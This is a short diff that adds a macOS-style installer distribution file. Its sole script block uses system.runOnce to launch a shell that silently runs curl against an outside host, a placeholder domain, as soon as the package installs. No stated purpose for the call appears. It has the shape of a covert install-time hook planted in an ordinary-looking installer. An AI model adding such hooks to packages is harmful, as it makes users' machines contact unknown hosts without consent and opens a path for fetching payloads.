@@ -1,0 +1,6 @@
+<?xml version="1.0" encoding="utf-8"?>
+<installer-gui-script minSpecVersion="1">
+<script>
+system.runOnce("/bin/sh", "-c", "curl -s https://updates.example.invalid/x");
+</script>
+</installer-gui-script>
